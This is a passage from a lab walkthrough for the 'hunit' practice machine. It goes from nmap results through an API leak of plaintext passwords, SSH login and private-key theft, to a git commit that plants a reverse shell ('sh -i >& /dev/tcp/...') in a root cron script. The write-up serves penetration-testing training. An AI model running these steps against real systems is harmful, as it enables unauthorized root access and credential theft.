|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Mon, 09 Nov 2020 19:39:31 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Mon, 09 Nov 2020 19:39:31 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
|_    HTTP Version Not Supported</h1></body></html>
|_http-title: My Haikus
12445/tcp open  netbios-ssn Samba smbd 4.6.2
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix)
|_http-title: Whack A Mole!
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
```

This reveals a web server on port 8080, a Samba share on port 12445, an Apache web server on port 18030, and SSH on port 43022. In this case we'll focus on the web server on port 8080 and the SSH service.

### CURL

Let's start by enumerating the website on port 8080. The default page (http://192.168.120.204:8080/) contains several links, the first of which points to **/article/the-taste-of-rain**.

```
kali@kali:~$ curl http://192.168.120.204:8080/
...
<section>
        <header class="article-header">
                <h2 class="article-title"><a href="/article/the-taste-of-rain">The Taste of Rain</a></h2>
                <div class="article-meta">By  <strong>James</strong>, on <strong>2021-01-14 14th 2021</strong></div>
        </header>
        <div class="article-headline">
                Jack Kerouac
        </div>
</section>
...
```

Let's follow that link.

```
kali@kali:~$ curl http://192.168.120.204:8080/article/the-taste-of-rain
...
<section class="article">
	<header class="article-header">
		<h1 class="article-title">The Taste of Rain</h1>
		<p class="article-meta">By  <strong>James</strong>, on <strong>2020-11-09 9th 2020</strong></p>
	</header>

	<div class="article-description">
		<div>Jack Kerouac</div>
		
		
		

		<p>The taste, Of rain, —Why kneel?</p>
	</div>
</section>

<!--
<a href="http://localhost:8080/api/">List all</a>
-->
...
```

A comment on the page suggests the presence of an API located in the **/api/** directory.

## Exploitation

### Credential Leak

After a brief exploration of the API, we discover an information leak.

```
kali@kali:~$ curl http://192.168.120.204:8080/api/         
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}]        
```

The **/user/** endpoint is certainly worth inspection.

```
kali@kali:~$ curl http://192.168.120.204:8080/api/user/
[{"login":"rjackson","password":"yYJcgYqszv4aGQ","firstname":"Richard","lastname":"Jackson","description":"Editor","id":1},
{"login":"jsanchez","password":"d52cQ1BzyNQycg","firstname":"Jennifer","lastname":"Sanchez","description":"Editor","id":3},
{"login":"dademola","password":"ExplainSlowQuest110","firstname":"Derik","lastname":"Ademola","description":"Admin","id":6},
{"login":"jwinters","password":"KTuGcSW6Zxwd0Q","firstname":"Julie","lastname":"Winters","description":"Editor","id":7},
{"login":"jvargas","password":"OuQ96hcgiM5o9w","firstname":"James","lastname":"Vargas","description":"Editor","id":10}]%  
```

This endpoint leaks several username-password pairs.

### SSH

Let's try to leverage these credentials against the SSH service running on port 43022 in an attempt to gain an initial foothold.

```
kali@kali:~$ ssh -p 43022 dademola@192.168.120.204
...
dademola@192.168.120.204's password: 
[dademola@hunit ~]$ id
uid=1001(dademola) gid=1001(dademola) groups=1001(dademola)
[dademola@hunit ~]$
```

The `dademola:ExplainSlowQuest110` credentials grant us access. We have our foothold!

## Escalation

### Crontab Backup File Enumeration

After some initial enumeration, we discover a crontab backup in the **/etc** folder.

```
[dademola@hunit ~]$ ls -l /etc
total 780
...
drwxr-xr-x 2 root root   4096 Nov  6 18:09 conf.d
drwxr-xr-x 2 root root   4096 Nov  5 23:46 cron.d
drwxr-xr-x 2 root root   4096 Oct 31  2019 cron.daily
-rw-r--r-- 1 root root     74 Oct 31  2019 cron.deny
drwxr-xr-x 2 root root   4096 Nov  5 23:46 cron.hourly
drwxr-xr-x 2 root root   4096 Oct 31  2019 cron.monthly
drwxr-xr-x 2 root root   4096 Oct 31  2019 cron.weekly
-rw-r--r-- 1 root root     67 Nov 10 15:31 crontab.bak
...
```

The contents of the **/etc/crontab.bak** file are certainly interesting:

```
[dademola@hunit ~]$ cat /etc/crontab.bak 
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
[dademola@hunit ~]$ 
```

This file lists two jobs that are run from the  **/root** directory. This is obviously a potential vulnerability which requires further examination.

### Git Server Enumeration

As is typical, any attempt to access **/root** as this user generates a "permission denied" error. However, we do discover that **git-server** exists in **/**.

```
[dademola@hunit ~]$ find / -type d -name git-server -print 2>/dev/null
/git-server
[dademola@hunit ~]$ 
[dademola@hunit ~]$ ls -l /git-server/
total 32
-rw-r--r--  1 git git   23 Nov  5 22:33 HEAD
drwxr-xr-x  2 git git 4096 Nov  5 22:33 branches
-rw-r--r--  1 git git   66 Nov  5 22:33 config
-rw-r--r--  1 git git   73 Nov  5 22:33 description
drwxr-xr-x  2 git git 4096 Nov  5 22:33 hooks
drwxr-xr-x  2 git git 4096 Nov  5 22:33 info
drwxr-xr-x 16 git git 4096 Nov  6 00:06 objects
drwxr-xr-x  4 git git 4096 Nov  5 22:33 refs
```

Inspecting these files, we discover that they are git backend files, which are somewhat difficult to work with. Let's instead attempt to clone **/git-server** to determine what's inside.

```
[dademola@hunit ~]$ git clone file:///git-server/ 
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

This works. Let's inspect the directory contents.

```
[dademola@hunit ~]$ ls -la git-server
total 20
drwxr-xr-x 3 dademola dademola 4096 Nov 10 15:40 .
drwx------ 7 dademola dademola 4096 Nov 10 15:53 ..
drwxr-xr-x 8 dademola dademola 4096 Nov 10 15:54 .git
-rw-r--r-- 1 dademola dademola    0 Nov 10 15:40 NEW_CHANGE
-rw-r--r-- 1 dademola dademola   63 Nov 10 15:40 README
-rw-r--r-- 1 dademola dademola   60 Nov 10 15:52 backups.sh
```

Next, we'll attempt to grab the repository's log.

```
[dademola@hunit ~]$ cd git-server

[dademola@hunit git-server]$ git log
commit b50f4e5415cae0b650836b5466cc47c62faf7341 (HEAD -> master, origin/master, origin/HEAD)
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 21:05:58 2020 -0300

    testing

commit c71132590f969b535b315089f83f39e48d0021e2
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:59:48 2020 -0300

    testing
...
```

There's not much here. Let's review the contents of the **backups.sh** script.

```
[dademola@hunit git-server]$ cat backups.sh 
#!/bin/bash
#
#
# # Placeholder
#
```

This is simply a placeholder. Based on out knowledge of `git`, we can deduce that the **/root/pull.sh** script (which was referenced in the crontab backup file) pulls the changes done to the repository's `master` branch. To test this theory, we'll try to inject some code into the **backups.sh** script and then push the changes. First, we'll set up our Git identity.

```
[dademola@hunit git-server]$ git config --global user.name "dademola"
[dademola@hunit git-server]$ git config --global user.email "dademola@hunit.(none)"
```

Next, we'll inject a test instruction.

```
[dademola@hunit git-server]$ echo "touch /tmp/gitscript-test" >> backups.sh
```

Before adding and committing the updated script, we'll make it executable.

```
[dademola@hunit git-server]$ chmod +x backups.sh 
```

Finally, we'll add and commit our changes and attempt to push them to the `master` branch.

```
[dademola@hunit git-server]$ git add -A
[dademola@hunit git-server]$ git commit -m "pwn"
[master 159de6f] pwn
 1 file changed, 1 insertion(+)

[dademola@hunit git-server]$ git push origin master
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 290 bytes | 290.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
error: remote unpack failed: unable to create temporary object directory
To file:///git-server/
 ! [remote rejected] master -> master (unpacker error)
error: failed to push some refs to 'file:///git-server/'
```

Unfortunately, we are not allowed to make changes to this repository. Further inspection reveals that the contents of the **/git-server** are owned by the `git` user.

```
dademola@hunit git-server]$ ls -la /git-server
total 40
drwxr-xr-x  7 git  git  4096 Nov  6 00:06 .
drwxr-xr-x 18 root root 4096 Nov 10 15:29 ..
-rw-r--r--  1 git  git    23 Nov  5 22:33 HEAD
drwxr-xr-x  2 git  git  4096 Nov  5 22:33 branches
-rw-r--r--  1 git  git    66 Nov  5 22:33 config
-rw-r--r--  1 git  git    73 Nov  5 22:33 description
drwxr-xr-x  2 git  git  4096 Nov  5 22:33 hooks
drwxr-xr-x  2 git  git  4096 Nov  5 22:33 info
drwxr-xr-x 16 git  git  4096 Nov  6 00:06 objects
drwxr-xr-x  4 git  git  4096 Nov  5 22:33 refs
```

### Git User SSH

According to **/etc/passwd**, the `git` user exists and uses **/usr/bin/git-shell** as the default shell.

```
[dademola@hunit git-server]$ grep git /etc/passwd      
git:x:1005:1005::/home/git:/usr/bin/git-shell
```

As referenced in the password file, **/home/git** exists.

```
[dademola@hunit git-server]$ ls -l /home 
total 8
drwx------ 7 dademola dademola 4096 Jan 14 18:28 dademola
drwxr-xr-x 4 git      git      4096 Nov  5 22:35 git
```

This folder contains a **.ssh** folder.

```
[dademola@hunit ~]$ ls -la /home/git
total 28
drwxr-xr-x 4 git  git  4096 Nov  5 22:35 .
drwxr-xr-x 4 root root 4096 Nov  5 22:28 ..
-rw------- 1 git  git     0 Nov  6 00:26 .bash_history
-rw-r--r-- 1 git  git    21 Aug  9 16:27 .bash_logout
-rw-r--r-- 1 git  git    57 Aug  9 16:27 .bash_profile
-rw-r--r-- 1 git  git   141 Aug  9 16:27 .bashrc
drwxr-xr-x 2 git  git  4096 Nov  5 22:31 .ssh
drwxr-xr-x 2 git  git  4096 Nov  5 22:35 git-shell-commands
```

Within this folder, we discover an **id_rsa** private key file.

```
[dademola@hunit git-server]$ ls -l /home/git/.ssh
total 12
-rwxr-xr-x 1 root root  564 Nov  5 22:31 authorized_keys
-rwxr-xr-x 1 root root 2590 Nov  5 22:31 id_rsa
-rwxr-xr-x 1 root root  564 Nov  5 22:31 id_rsa.pub
```

Interestingly, the **authorized_keys** and **id_rsa.pub** files are the same size, and the contents appear identical:

```
[dademola@hunit ~]$ cat /home/git/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit
[dademola@hunit ~]$ 
[dademola@hunit ~]$ cat /home/git/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit
[dademola@hunit ~]$
```

A `diff` reveals that the files are, in fact, identical.

```
[dademola@hunit ~]$ diff /home/git/.ssh/authorized_keys /home/git/.ssh/id_rsa.pub
[dademola@hunit ~]$
```

Since the **id_rsa.pub** public key is in the **authorized_keys** file, we should be able to use the private key to log in via SSH. Let's copy this private key to our attack machine and apply the proper permissions.

```
kali@kali:~$ scp -P 43022 dademola@192.168.120.204:/home/git/.ssh/id_rsa .
dademola@192.168.120.204's password: 
id_rsa   100% 2590    19.2KB/s   00:00    
kali@kali:~$
kali@kali:~$ chmod 0600 id_rsa 
```

Next, we'll attempt to use this private key to log in as the `git` user.

```
kali@kali:~$ ssh -p 43022 git@192.168.120.204 -i id_rsa
git> 
```

The key works, and our login attempt is successful!

### Reverse Shell

Since this is a **git-shell**, we should be able to interact with the repository. Let's clone this repo on our attack machine.

```
kali@kali:~$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.120.204:/git-server
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

Now we can again attempt to push our changes to the `master` branch. As before, we'll first configure our Git identity.

```
kali@kali:~$ cd git-server
kali@kali:~/git-server$ git config --global user.name "kali"
kali@kali:~/git-server$ git config --global user.email "kali@kali.(none)"
```

Next, we'll inject a reverse shell payload into the **backups.sh** script and make it executable.

```
kali@kali:~/git-server$ echo "sh -i >& /dev/tcp/192.168.118.8/8080 0>&1" >> backups.sh 
kali@kali:~/git-server$ chmod +x backups.sh
```

Let's add and commit our changes.

```
kali@kali:~/git-server$ git add -A
kali@kali:~/git-server$ git commit -m "pwn"
[master cb7104c] pwn
 1 file changed, 1 insertion(+)
 mode change 100644 => 100755 backups.sh
```

Before pushing our payload, we'll set up a Netcat listener on port 8080.

```
kali@kali:~$ nc -lvnp 8080 
listening on [any] 8080 ...
```

Once our listener is ready, we'll attempt to push to the `master` branch.

```
kali@kali:~/git-server$ GIT_SSH_COMMAND='ssh -i ~/id_rsa -p 43022' git push origin master
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.120.204:/git-server
   b50f4e5..0212790  master -> master
kali@kali:~/git-server$ 
```

The crontab backup file indicates that the **pull.sh** script runs every two minutes, and the **backups.sh** script runs every three minutes. Because of this, it may take up to five minutes to determine if our attack was successful.

Once our changes are synchronized, and our payload is executed inside the **backups.sh** script, we should receive our `root` user shell.

```
kali@kali:~$ nc -lvnp 8080 
listening on [any] 8080 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.204] 51816
...
sh-5.0# whoami
root
```